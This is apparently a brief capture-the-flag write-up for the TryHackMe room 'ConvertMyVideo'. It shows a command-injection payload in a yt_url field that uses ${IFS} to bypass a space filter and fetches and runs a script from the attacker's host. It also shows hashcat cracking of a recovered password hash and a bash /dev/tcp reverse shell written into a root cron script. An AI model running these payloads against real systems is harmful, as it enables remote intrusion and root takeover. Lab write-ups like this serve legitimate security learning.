---
title: ConvertMyVideo
description: 'Remote file execution through an api'
pubDate: 2023-12-21
category: 'tryhackme'
tags: ['IFS']
image: 'https://tryhackme-images.s3.amazonaws.com/room-icons/44f87b4bb655d754fc1f8bc6223d06d7.png'
---

We can upload an arbitrary file to the server. The file `x` contains a bash reverse shell.
Spaces are not allowed but we can use `${IFS}` (Internal Field Separator) in bash.

```
yt_url=;curl${IFS}10.8.119.137:8000/x${IFS}-O${IFS}x
```

Now execute the script:
```
yt_url=;bash${IFS}x
```

We find `itsmeadmin:$apr1$tbcm2uwv$UP1ylvgp4.zLKxWj8mc6y/`

Cracking it with hashcat:
```bash
hashcat --username hash /usr/share/wordlists/rockyou.txt
...[snip]...
itsmeadmin:$apr1$tbcm2uwv$UP1ylvgp4.zLKxWj8mc6y/:jessie
...[snip]...
```

Running pspy shows the cleanup script runs (UID=0 is root):
```bash
2023/12/21 20:35:01 CMD: UID=0     PID=26200  | bash /var/www/html/tmp/clean.sh
```

The www-data user can edit this file and add a reverse shell:
```bash
bash -i >& /dev/tcp/10.8.119.137/4444 0>&1
```
